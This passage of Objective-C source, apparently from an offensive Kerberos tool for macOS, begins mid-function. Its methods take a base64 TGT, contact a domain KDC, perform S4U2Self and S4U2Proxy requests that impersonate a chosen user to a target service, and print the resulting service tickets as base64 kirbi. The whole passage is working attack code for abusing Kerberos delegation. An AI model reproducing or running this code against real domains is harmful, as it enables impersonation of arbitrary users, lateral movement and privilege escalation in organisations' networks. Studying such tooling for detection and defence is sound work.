        return [kirbi base64EncodedStringWithOptions:0];
    }else{
        return NULL;
    }
}
-(NSString*)s4uTicket:(NSString*)tgtKirbi ConnectDomain:(NSString*)connectDomainInput TargetUser:(NSString*)targetUser SPN:(NSString*)spn{
    NSString* connectDomain = connectDomainInput;
    NSString* spnDomain;
    
    Krb5Ticket TGT = parseKirbi([[NSData alloc] initWithBase64EncodedString:tgtKirbi options:0]);
    
    if( connectDomain == NULL ){
        connectDomain = TGT.app29.realm29.KerbGenStringvalue;
    }
    
    kdc* kerbdc = [kdc alloc];
    int result = [kerbdc connectDomain:connectDomain.UTF8String];
    if(result == -1){
        return NULL;
    }
    printf("[*] Requesting service ticket to %s as %s\n", TGT.app29.cname.username.KerbGenStringvalue.UTF8String, targetUser.UTF8String);
    NSData* tgsreq = createS4U2SelfReq(TGT, targetUser);
    result = [kerbdc sendBytes:tgsreq];
    if(result == -1){
        return NULL;
    }else{
        printf("[+] Successfully sent request\n");
    }
    NSData* holder = [kerbdc recvBytes];
    if(holder == NULL){
        return NULL;
    }else{
        printf("[+] Successfully received response\n");
    }
    Krb5Ticket sTicket = parseTGSREP(holder, TGT);
    if(sTicket.app29 != NULL){
        //we got a TGS back, now adjust it to be what we actually wanted
        printf("[*] Describing ticket\n");
        printf("%s\n", describeTicket(sTicket).UTF8String);
        printf("[*] Creating Kirbi:\n");
        NSData* kirbi = createKirbi(sTicket);
        printf("%s\n", [kirbi base64EncodedStringWithOptions:0].UTF8String);
    }else{
        return NULL;
    }
    //now that we have a forwardable service ticket, do the S4U2Proxy process to get the next service ticket
    [kerbdc closeConnection];
    
    if( [spn containsString:@"@"] ){
        //spn is in the form service/host@domain, so we need to split that out
        NSArray* splitPieces = [spn componentsSeparatedByString:@"@"];
        spn = (NSString*)[splitPieces objectAtIndex:0];
        spnDomain = (NSString*)[splitPieces objectAtIndex:1];
    }else{
        spnDomain = sTicket.app29.realm29.KerbGenStringvalue;
    }
    printf("[*] Impersonating %s to service %s@%s via S4U2Proxy\n", sTicket.app29.cname.username.KerbGenStringvalue.UTF8String, spn.UTF8String, spnDomain.UTF8String);
    NSData* S4U2ProxyReq = createS4U2ProxyReq(TGT, spn, spnDomain, [sTicket.app1 collapseToNSData]);
    result = [kerbdc connectDomain:connectDomain.UTF8String];
    if(result == -1){
        return NULL;
    }
    result = [kerbdc sendBytes:S4U2ProxyReq];
    if(result == -1){
        return NULL;
    }else{
        printf("[+] Successfully sent request\n");
    }
    holder = [kerbdc recvBytes];
    if(holder == NULL){
        return NULL;
    }else{
        printf("[+] Successfully received response\n");
    }
    Krb5Ticket s4uTicket = parseTGSREP(holder, TGT);
    if(s4uTicket.app29 != NULL){
        printf("[*] Describing ticket\n");
        printf("%s\n", describeTicket(s4uTicket).UTF8String);
        printf("[*] Creating Kirbi:\n");
        NSData* kirbi = createKirbi(s4uTicket);
        printf("%s\n", [kirbi base64EncodedStringWithOptions:0].UTF8String);
        return [kirbi base64EncodedStringWithOptions:0];
    }else{
        return NULL;
    }
}
-(NSString*)s4u2selfTicket:(NSString*)tgtKirbi ConnectDomain:(NSString*)connectDomainInput TargetUser:(NSString*)targetUser{
    NSString* connectDomain = connectDomainInput;
    NSString* spnDomain;
    
    Krb5Ticket TGT = parseKirbi([[NSData alloc] initWithBase64EncodedString:tgtKirbi options:0]);
    
    if( connectDomain == NULL ){
        connectDomain = TGT.app29.realm29.KerbGenStringvalue;
    }
    
    kdc* kerbdc = [kdc alloc];
    int result = [kerbdc connectDomain:connectDomain.UTF8String];
    if(result == -1){
        return NULL;
    }
    printf("[*] Requesting service ticket to %s as %s\n", TGT.app29.cname.username.KerbGenStringvalue.UTF8String, targetUser.UTF8String);
    NSData* tgsreq = createS4U2SelfReq(TGT, targetUser);
    result = [kerbdc sendBytes:tgsreq];
    if(result == -1){
        return NULL;
    }else{
        printf("[+] Successfully sent request\n");
    }
    NSData* holder = [kerbdc recvBytes];
    if(holder == NULL){
        return NULL;
    }else{
        printf("[+] Successfully received response\n");
    }
    Krb5Ticket sTicket = parseTGSREP(holder, TGT);
    if(sTicket.app29 != NULL){
        //we got a TGS back, now adjust it to be what we actually wanted
        printf("[*] Describing ticket\n");
        printf("%s\n", describeTicket(sTicket).UTF8String);
        printf("[*] Creating Kirbi:\n");
        NSData* kirbi = createKirbi(sTicket);
        [kerbdc closeConnection];
        printf("%s\n", [kirbi base64EncodedStringWithOptions:0].UTF8String);
        return [kirbi base64EncodedStringWithOptions:0];
    }else{
        return NULL;
    }
}
@end
